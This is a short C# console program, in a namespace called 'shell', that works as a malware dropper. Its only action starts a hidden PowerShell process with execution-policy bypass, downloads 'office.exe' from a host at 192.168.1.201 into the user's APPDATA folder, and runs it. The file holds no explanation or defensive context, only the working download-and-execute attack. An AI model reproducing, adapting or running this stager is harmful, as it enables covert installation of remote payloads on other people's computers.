using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace shell
{
    class Program
    {
        static void Main(string[] args)
        {
            string strCmdText;
            strCmdText = "powershell -nop -w hidden -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.201/office.exe', $env:APPDATA + '\\office.exe'); Start-Process $env:APPDATA'\\office.exe'";
            System.Diagnostics.Process.Start("powershell.exe",strCmdText);
        }
    }
}
